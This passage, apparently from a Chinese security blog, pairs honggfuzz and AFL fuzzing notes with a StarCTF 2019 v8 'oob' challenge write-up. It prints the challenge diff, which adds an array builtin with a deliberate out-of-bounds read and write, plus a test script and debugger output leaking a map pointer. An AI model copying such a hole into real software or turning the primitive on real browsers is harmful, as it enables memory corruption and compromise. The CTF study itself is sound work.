line)</span><br><span class="line"> --linux_symbols_wl VALUE</span><br><span class="line">Symbols whitelist filter file (one entry per line)</span><br><span class="line"> --linux_addr_low_limit VALUE</span><br><span class="line">Address limit (from si.si_addr) below which crashes are not reported, (default: 0)</span><br><span class="line"> --linux_keep_aslr </span><br><span class="line">Don&#39;t disable ASLR randomization, might be useful with MSAN</span><br><span class="line"> --linux_perf_ignore_above VALUE</span><br><span class="line">Ignore perf events which report IPs above this address</span><br><span class="line"> --linux_perf_instr </span><br><span class="line">Use PERF_COUNT_HW_INSTRUCTIONS perf</span><br><span class="line"> --linux_perf_branch </span><br><span class="line">Use PERF_COUNT_HW_BRANCH_INSTRUCTIONS perf</span><br><span class="line"> --linux_perf_bts_edge </span><br><span class="line">Use Intel BTS to count unique edges</span><br><span class="line"> --linux_perf_ipt_block </span><br><span class="line">Use Intel Processor Trace to count unique blocks (requires libipt.so)</span><br><span class="line"> --linux_perf_kernel_only </span><br><span class="line">Gather kernel-only coverage with Intel PT and with Intel BTS</span><br><span class="line"> --linux_ns_net </span><br><span class="line">Use Linux NET namespace isolation</span><br><span class="line"> --linux_ns_pid </span><br><span class="line">Use Linux PID namespace isolation</span><br><span class="line"> --linux_ns_ipc </span><br><span class="line">Use Linux IPC namespace isolation</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line"> Run the binary over a mutated file chosen from the directory. Disable fuzzing feedback (static mode):</span><br><span class="line">  honggfuzz -i input_dir -x -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> As above, provide input over STDIN:</span><br><span class="line">  honggfuzz -i input_dir -x -s -- &#x2F;usr&#x2F;bin&#x2F;djpeg</span><br><span class="line"> Use compile-time instrumentation (-fsanitize-coverage&#x3D;trace-pc-guard,...):</span><br><span class="line">  honggfuzz -i input_dir -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> Use persistent mode w&#x2F;o instrumentation:</span><br><span class="line">  honggfuzz -i input_dir -P -x -- &#x2F;usr&#x2F;bin&#x2F;djpeg_persistent_mode</span><br><span class="line"> Use persistent mode and compile-time (-fsanitize-coverage&#x3D;trace-pc-guard,...) instrumentation:</span><br><span class="line">  honggfuzz -i input_dir -P -- &#x2F;usr&#x2F;bin&#x2F;djpeg_persistent_mode</span><br><span class="line"> Run the binary with dynamically generate inputs, maximize total no. of instructions:</span><br><span class="line">  honggfuzz --linux_perf_instr -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> As above, maximize total no. of branches:</span><br><span class="line">  honggfuzz --linux_perf_branch -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> As above, maximize unique branches (edges) via Intel BTS:</span><br><span class="line">  honggfuzz --linux_perf_bts_edge -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> As above, maximize unique code blocks via Intel Processor Trace (requires libipt.so):</span><br><span class="line">  honggfuzz --linux_perf_ipt_block -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br></pre></td></tr></table></figure><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install pkg-config m4 libtool automake autoconf</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;LibRaw&#x2F;LibRaw.git</span><br><span class="line">$ cd LibRaw</span><br><span class="line">..&#x2F;Libraw$ export CC&#x3D;hfuzz-clang CXX&#x3D;hfuzz-clang++</span><br><span class="line">..&#x2F;Libraw$ autoreconf --install</span><br><span class="line">..&#x2F;Libraw$ .&#x2F;configure</span><br><span class="line">..&#x2F;Libraw$ make</span><br></pre></td></tr></table></figure><blockquote><p>libtool: link: hfuzz-clang++ -g -O2 -fopenmp -o bin/.libs/dcraw_emu samples/bin_dcraw_emu-dcraw_emu.o  lib/.libs/libraw.so -lz -lm -fopenmp</p><p>编译插桩成功</p></blockquote><p>然后我们用 honggfuzz 跑一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LibRaw&#x2F;bin&#x2F;.libs$ export LD_LIBRARY_PATH&#x3D;..&#x2F;..&#x2F;lib&#x2F;.libs&#x2F;</span><br><span class="line">LibRaw&#x2F;bin&#x2F;.libs$ .&#x2F;dcraw_emu</span><br><span class="line">LibRaw&#x2F;bin&#x2F;.libs$ honggfuzz -f ..&#x2F;in -W ..&#x2F;out -t 5 -- .&#x2F;dcraw_emu ___FILE___</span><br></pre></td></tr></table></figure><p>页面显示大致如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-···········[ 0 days 00 hrs 28 mins 42 secs ] ··········</span><br><span class="line">Iterations : 35,520 [35. 52k]</span><br><span class="line">Mode [3&#x2F;3] : Feedback Driven Mode</span><br><span class="line">Target : .&#x2F;dcraw_ enu FILE_</span><br><span class="line">Threads : 1, CPUs: 2, CPU%: 200% [ 100%&#x2F;CPU]</span><br><span class="line">Speed : 0&#x2F;sec [avg: 20]</span><br><span class="line">Crashes : 78 [unique: 55, blocklist: o, verified: 0]</span><br><span class="line">Timeouts : 46 [5 sec]</span><br><span class="line">Corpus size : 2,965, nax: 1, 048,576 bytes, init: 20 files</span><br><span class="line">Cov Update : 0 days 00 hrs 00 mins 02 secs ago</span><br><span class="line">Coverage : edge: 1,110&#x2F;19,858 [5%] pc: 140 cnp: 89 ,337</span><br><span class="line">··········· [ LOGS ] ········· &#x2F; honggfuzz 2.4 &#x2F; -</span><br><span class="line">z:409 Tm:3,746us (i&#x2F;b&#x2F;h&#x2F;e&#x2F;p&#x2F;c) New:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;6, Cur:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;178</span><br><span class="line">Sz:430 Tฅ:4 , 501us (t&#x2F;b&#x2F;h&#x2F;e&#x2F;p&#x2F;c) New:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;2, Cur:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;178</span><br><span class="line">Sz :228001 Tm:238,719us (i&#x2F;b&#x2F;h&#x2F;e&#x2F;p&#x2F;c) New:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;17, Cur :0&#x2F;0&#x2F;0&#x2F;2&#x2F;0&#x2F;302</span><br></pre></td></tr></table></figure><h1 id="AFL-Build"><a href="#AFL-Build" class="headerlink" title="AFL Build"></a>AFL Build</h1><p>详细参考上篇：<a href="https://0xfocu5.github.io/posts/2ba75ee3/">https://0xfocu5.github.io/posts/2ba75ee3/</a></p><ul><li>直接安装：<code>sudo apt install afl</code></li><li><a href="http://lcamtuf.coredump.cx/afl/">官网</a>下载压缩包，解压后在目录中打开终端输入：<code>sudo make;sudo make install</code></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/googleprojectzero/winafl/issues/179">https://github.com/googleprojectzero/winafl/issues/179</a></p><p><a href="https://github.com/googleprojectzero/winafl">https://github.com/googleprojectzero/winafl</a></p><p><a href="https://x9security.com/installing-winafl/">https://x9security.com/installing-winafl/</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Winafl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> Build </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019-StarCtf-oob</title>
      <link href="posts/7eb4a1e6/"/>
      <url>posts/7eb4a1e6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过 <code>2019-starctf</code>的一道例题尝试入门 <code>v8</code>。跟着前辈们学习并记录一下自己的复现路程。</p><p>环境：Ubuntu 18.04</p><p>题目：<a href="https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip">下载链接</a>:<a href="https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip">https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>翻墙 翻墙 翻墙</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git <span class="comment">#下载谷歌源码管理器</span></span><br><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:~/depot_tools  <span class="comment">#加入环境变量</span></span><br><span class="line">$ mkdir chromium</span><br><span class="line">$ <span class="built_in">cd</span> chromium</span><br><span class="line">$ fetch --no-history v8  <span class="comment">#获取v8源码</span></span><br><span class="line">$ <span class="built_in">cd</span> v8</span><br></pre></td></tr></table></figure><p>把题目给出的<code>diff</code>文件应用到源码中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">$ gclient sync <span class="comment">#同步solution的各个仓库</span></span><br><span class="line">$ git apply ../oob.diff  <span class="comment">#将diff文件加入到v8中源代码分支中</span></span><br><span class="line">$ ./tools/dev/v8gen.py x64.release</span><br><span class="line">$ ninja -C ./out.gn/x64.release <span class="comment"># Release version</span></span><br><span class="line">$ ./tools/dev/v8gen.py x64.debug</span><br><span class="line">$ ninja -C ./out.gn/x64.debug <span class="comment"># Debug version</span></span><br></pre></td></tr></table></figure><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="V8流程"><a href="#V8流程" class="headerlink" title="V8流程"></a>V8流程</h3><p><code>JavaScript</code>是一门解释型语言，而<code>v8</code>则是<code>chrome</code>浏览器的<code>JavaScript</code>解析引擎，大多数漏洞都是由<code>v8</code>所引起的 (<code>v8</code>编译过后的可执行文件是<code>d8</code>).</p><p><code>JavaScript</code>的执行流程大致如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200922110125.png" alt="image-20200921161412221"></p><ul><li>JS 源代码经过词法分析形成 <code>Token</code>，解析器(Parser)解析<code>token</code>形成抽象语法树(AST)</li><li>解释器(Ignition)将 AST 生成可执行的字节码。解释器可以直接执行字节码，或者通过编译器将其编译为二进制的机器代码再执行。</li><li>解释器执行字节码过程中，如果发现代码被重复执行，热点代码(HotSpot)超过阈值后就会丢给优化编译器(TurboFan)编译成二进制代码，然后优化。下次再执行时则直接执行这段优化后的二进制代码。</li><li>如果JS对象发生变更，优化后的二进制代码变为无效代码，编译器执行反优化，下次执行就回退到解释器解释执行。</li></ul><h3 id="V8调试"><a href="#V8调试" class="headerlink" title="V8调试"></a>V8调试</h3><p>入这个选项就可以在<code>js</code>中调用一些有助于调试的本地运行时函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj) 输出对象地址</span><br><span class="line">%SystemBreak() 触发调试中断主要结合gdb等调试器使用</span><br></pre></td></tr></table></figure><p>PS:v8团队的专门编写了一个<code>gdb</code>的<code>gdbinit</code>脚本。在<code>~/xxx/v8/tools</code>下，将其更名为<code>gdbinit_v8</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cp gdbinit_v8 ~/.gdbinit_v8</span><br><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ vim .gdbinit</span><br><span class="line"><span class="comment">#加入下面内容</span></span><br><span class="line"><span class="built_in">source</span> ~/.gdbinit_v8</span><br><span class="line"><span class="built_in">source</span> User/xxx/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure><p>有两个常用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">job [address_of_obj]  # gdbinit_v8中的特有命令，打印出对象内存结构，注意对象地址为其实际地址加1</span><br><span class="line">telescope [real_address] [num] # pwndbg命令，打印出real_address地址处num个内存单元的值，该地址为真实地址</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;focu5&#x2F;chromium&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">...</span><br><span class="line">DebugPrint: 0x2658b5f8df19: [JSArray]</span><br><span class="line"> - map: 0x2507e8002d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3425c3f51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1a4835400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3142d66401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"> ...</span><br><span class="line">pwndbg&gt; job 0x2658b5f8df19</span><br><span class="line">0x2658b5f8df19: [JSArray]</span><br><span class="line"> - map: 0x2507e8002d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3425c3f51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1a4835400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3142d66401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>PS：在<code>release</code>使用 <code>job</code>命令会报`No symbol “_v8_internal_Print_Object” in current context. 的错误</p><table><thead><tr><th align="center">map</th><th align="center">表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型</th></tr></thead><tbody><tr><td align="center">prototype</td><td align="center">prototype</td></tr><tr><td align="center">elements</td><td align="center">对象元素</td></tr><tr><td align="center">length</td><td align="center">元素个数</td></tr><tr><td align="center">properties</td><td align="center">属性</td></tr></tbody></table><blockquote><p>Value B is an 8 bytes long value //in x64.<br>If B is a double:<br>    B is the binary representation of a double<br>Else:<br>    if B is a int32:<br>        B = the value of B &lt;&lt; 32 // which mean 0xdeadbeef is 0xdeadbeef00000000 in v8<br>    else: // B is a pointer<br>        B = B | 1</p></blockquote><p><code>v8</code>在内存中只有数字和对象两种表示。为了区分两者，v8在所有对象的内存地址末尾都加了1。例：上述 elements的实际地址应为 <code>0x2658b5f8de39-1</code></p><h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>分析题目所给出的<code>diff</code>文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">diff --git a&#x2F;src&#x2F;bootstrapper.cc b&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f 100644</span><br><span class="line">--- a&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span><br><span class="line">+                          Builtins::kArrayOob,2,false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line">diff --git a&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc b&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">index 8df340e..9b828ab 100644</span><br><span class="line">--- a&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  &#x2F;&#x2F; namespace</span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len &#x3D; args.length();</span><br><span class="line">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array &#x3D; Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements &#x3D; FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+    uint32_t length &#x3D; static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line">+    if(len &#x3D;&#x3D; 1)&#123;</span><br><span class="line">+        &#x2F;&#x2F;read</span><br><span class="line">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;else&#123;</span><br><span class="line">+        &#x2F;&#x2F;write</span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+        elements.set(length,value-&gt;Number());</span><br><span class="line">+        return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h b&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">index 0447230..f113a81 100644</span><br><span class="line">--- a&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">+++ b&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">@@ -368,6 +368,7 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   &#x2F;* https:&#x2F;&#x2F;tc39.github.io&#x2F;proposal-flatMap&#x2F;#sec-Array.prototype.flatMap *&#x2F;   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   &#x2F;* ArrayBuffer *&#x2F;                                                            \</span><br><span class="line">   &#x2F;* ES #sec-arraybuffer-constructor *&#x2F;                                        \</span><br><span class="line">diff --git a&#x2F;src&#x2F;compiler&#x2F;typer.cc b&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">index ed1e4a5..c199e3a 100644</span><br><span class="line">--- a&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtins::kArrayOob:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     &#x2F;&#x2F; ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><ul><li>自定义了一个函数kArrayOob，可以通过oob调用</li><li>该函数将首先检查参数的数量是否大于2（第一个参数始终是<code>this</code>参数）。如果是，则返回undefined。</li><li>如果只有一个参数（<code>this</code>），则会返回<code>array[length]</code>。</li><li>如果有两个参数（<code>this</code>和<code>value</code>），它将<code>value</code>作为一个浮点数写入<code>array[length]</code>。(以上所述的参数均为cpp中)</li><li>上述逻辑转换为JavaScript中的对应逻辑就是，当<code>oob</code>函数的参数为空时，返回数组对象第length个元素内容；当<code>oob</code>函数参数个数不为0时，就将第一个参数写入到数组中的第length个元素位置。</li></ul><p>编写<code>test.js</code>如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> addr = a.oob();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] oob return addr:&quot;</span> + addr.toString());</span><br><span class="line">%SystemBreak();</span><br><span class="line">a.oob(<span class="number">2</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x25641fd4ddd9-1</span><br><span class="line">00:0000│   0x25641fd4ddd8 —▸ 0xe46856c2d99 ◂— 0x400003e40e90401&lt;--- map</span><br><span class="line">01:0008│   0x25641fd4dde0 —▸ 0x3e40e9040c71 ◂— 0x3e40e90408&lt;--- properties</span><br><span class="line">02:0010│   0x25641fd4dde8 —▸ 0x25641fd4dd69 ◂— 0x3e40e90408&lt;--- elements</span><br><span class="line">03:0018│   0x25641fd4ddf0 ◂— 0x300000000&lt;--- length</span><br><span class="line">04:0020│   0x25641fd4ddf8 ◂— 0x0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope  0x25641fd4dd69-1</span><br><span class="line">00:0000│   0x25641fd4dd68 —▸ 0x3e40e9040851 ◂— 0x3e40e90401</span><br><span class="line">01:0008│   0x25641fd4dd70 ◂— 0x300000000&lt;--- length</span><br><span class="line">02:0010│   0x25641fd4dd78 ◂— 0x100000000&lt;--- elements</span><br><span class="line">03:0018│   0x25641fd4dd80 ◂— 0x200000000&lt;--- elements</span><br><span class="line">04:0020│   0x25641fd4dd88 ◂— 0x300000000&lt;--- elements</span><br><span class="line">05:0028│   0x25641fd4dd90 —▸ 0x3e40e9040851 ◂— 0x3e40e90401&lt;--- map</span><br><span class="line">06:0030│   0x25641fd4dd98 ◂— 0x400000000</span><br><span class="line">07:0038│   0x25641fd4dda0 —▸ 0x39ee928c3b29 ◂— 0x3e40e90409</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[*] oob return addr:3.38180564031224e-310</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x25641fd4dd90     &lt;--- map pointer</span><br><span class="line">$17 &#x3D; 3.3818056403122411e-310</span><br><span class="line"></span><br><span 